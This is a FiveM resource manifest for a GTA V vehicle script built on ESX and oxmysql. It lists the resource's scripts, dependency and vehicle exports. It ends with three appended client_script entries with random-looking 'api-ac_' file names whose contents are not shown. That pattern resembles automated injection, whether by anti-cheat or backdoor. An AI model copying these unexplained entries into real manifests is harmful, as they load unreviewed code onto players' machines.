fx_version "cerulean"

games {"gta5"}
lua54 'yes'


server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'config.lua',
	'server.lua'
}

client_scripts {
	'config.lua',
	'client.lua'
}

dependency 'es_extended'

exports {
	'GeneratePlate',
	'getVehicles'
}

server_exports {
	'GetVehicle'
}
client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"